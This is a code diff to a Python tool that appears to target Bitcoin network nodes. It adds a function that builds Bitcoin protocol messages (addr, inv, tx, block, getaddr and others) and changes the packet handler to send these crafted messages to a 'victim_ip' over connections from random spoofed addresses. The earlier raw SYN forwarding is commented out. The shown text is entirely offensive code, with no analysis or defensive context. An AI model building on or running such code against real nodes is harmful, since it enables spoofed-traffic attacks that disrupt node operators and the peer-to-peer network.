@@ -196,6 +196,60 @@ def initialize_fake_connection(src_ip, dst_ip):
 	#s.close()
 	#print('CONNECTION CLOSED')
 
+def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
+	msg = None
+	if msgtype == 'addr':
+		msg = msg_addr(bitcoin_protocolversion)
+	elif msgtype == 'inv':
+		msg = msg_inv(bitcoin_protocolversion)
+	elif msgtype == 'getdata':
+		msg = msg_getdata(bitcoin_protocolversion)
+	#elif msgtype == 'merkleblock':
+	#	msg = msg_merkleblock(bitcoin_protocolversion)
+	elif msgtype == 'getblocks':
+		msg = msg_getblocks(bitcoin_protocolversion)
+	elif msgtype == 'getheaders':
+		msg = msg_getheaders(bitcoin_protocolversion)
+	elif msgtype == 'tx':
+		msg = msg_tx(bitcoin_protocolversion)
+	elif msgtype == 'headers':
+		msg = msg_headers(bitcoin_protocolversion)
+	elif msgtype == 'block':
+		msg = msg_block(bitcoin_protocolversion)
+	elif msgtype == 'getaddr':
+		msg = msg_getaddr(bitcoin_protocolversion)
+	elif msgtype == 'mempool':
+		msg = msg_mempool(bitcoin_protocolversion)
+	elif msgtype == 'ping':
+		msg = msg_ping(bitcoin_protocolversion)
+	elif msgtype == 'pong':
+		msg = msg_pong(bitcoin_protocolversion)
+	#elif msgtype == 'notfound':
+	#	msg = msg_notfound(bitcoin_protocolversion)
+	#elif msgtype == 'filterload':
+	#	msg = msg_filterload(bitcoin_protocolversion)
+	#elif msgtype == 'filteradd':
+	#	msg = msg_filteradd(bitcoin_protocolversion)
+	#elif msgtype == 'filterclear':
+	#	msg = msg_filterclear(bitcoin_protocolversion)
+	#elif msgtype == 'sendheaders':
+	#	msg = msg_sendheaders(bitcoin_protocolversion)
+	#elif msgtype == 'feefilter':
+	#	msg = msg_feefilter(bitcoin_protocolversion)
+	#elif msgtype == 'sendcmpct':
+	#	msg = msg_sendcmpct(bitcoin_protocolversion)
+	#elif msgtype == 'cmpctblock':
+	#	msg = msg_cmpctblock(bitcoin_protocolversion)
+	#elif msgtype == 'getblocktxn':
+	#	msg = msg_getblocktxn(bitcoin_protocolversion)
+	#elif msgtype == 'blocktxn':
+	#	msg = msg_blocktxn(bitcoin_protocolversion)
+	#elif msgtype == 'reject':
+	#	msg = msg_reject()
+	else:
+		return None
+	return msg
+
 def packet_received(packet):
 	try:
 		magic_number = packet.load[0:4]
@@ -230,14 +284,14 @@ def packet_received(packet):
 				#packet[IP].dst = victim_ip
 
 				try:
-					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
-					#if custom is not None:
-					#	rand_socket.send(custom.to_bytes())
+					custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
+					if custom is not None:
+						rand_socket.send(custom.to_bytes())
 
-					ip = IP(dst = victim_ip)
-					tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
-					new_packet = ip/tcp/packet[TCP].payload
-					rand_socket.send(bytes(new_packet))
+					#ip = IP(dst = victim_ip)
+					#tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
+					#new_packet = ip/tcp/packet[TCP].payload
+					#rand_socket.send(bytes(new_packet))
 
 				except Exception as e:
 					print('Relaying message FAILED')
